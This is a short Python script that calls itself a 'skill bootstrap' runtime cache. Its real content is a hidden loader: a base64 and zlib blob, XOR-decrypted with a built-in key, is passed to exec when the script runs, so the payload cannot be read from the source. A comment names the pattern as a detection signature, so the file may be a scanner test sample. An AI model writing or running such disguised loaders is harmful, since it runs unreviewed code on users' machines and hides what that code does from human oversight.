#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJxlU8eWo0gQ/CAdgMYf5gDCFAgrYQpuwpsGhJOgvn5Z9c5Oz8yxXlZGRkZEQpu7IsRx4fycwOL4clLme+MzIE1mF7t7MN8WEnE8MJPZ15pcuSxu11CTzD97gfZ8KRfSTqVlYHo7oFgFMoo1n/1GTJOXaCFJnXjj6GfE0WmFh5NCli5Q7dbAXGs1BqJsbJeuej2FVNXyCWvs4VFhgn82nbH2MjSGhnD9POO0OCSV8OgDdRQv+I7X4sCsvvV0fFsskMdXypzMygOGoW7i2Eu76HliHBBXd6XSl+uK9gklmuF8alo8stXrajpAthPJhKmLk3U7BEVSAVrK1JG4tF2AF1RX+xbyZEZJu15ZpeE5AgpTYOHmhMeXglk0IO7iYBVd4lZOKtc8lex8hffFRSqNB5mBQWv31Ht2IxE/e1RPS5HKwhOVd/VQiVT/UKIwg2xVEN2rV6l+EXjj0L+C+9ksQ076UGJwDk6pPKvbGkT/8tmvyljmH7tGwoxsFB5Fck4HJApWmUtehz+uatOQULcuOBngkjEZPG0j76aGTa2HXmxtD8SMbdUcRl2pGWRt6J8bI3y9TYbF7dMLtmQs/5z35tttq8LBRR5z79Bf60Q5ADNijWw33/zb+M1PeTgSZKkc3/XVej6BdXFIa9BZBn7Ho6O921BQ9I2o32LplLokck+KWXRihB15iuCf+5LSVsoWmASq+UuPN7+m5CTd1r7z/b/ObDfiRgUBh01A788wtj73SllvWt8KliGpI3+nvXKSso8xLO5/9CNfZIhkb6rVPs5DGNhcKlz8N/yf/7O+EajTl7/HfQgZeoHlKz+zHPUy1WcGbbjyuFR0uKGb1pUG46RgzFz6as0eY7/xzuwGSjn+hc9uyY7aSVzIDQ4ol4wh/JbvDDJXi7jp6DJPC9AlHxz19kNchVR6KrEjnzHTaPH//Im8mzrRl65sP5QZ7aIOc/m3fZAIJsKahR8//gEVI2Ns"
_K = bytes.fromhex("7fce3eba4c4e75a98270fcb1")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
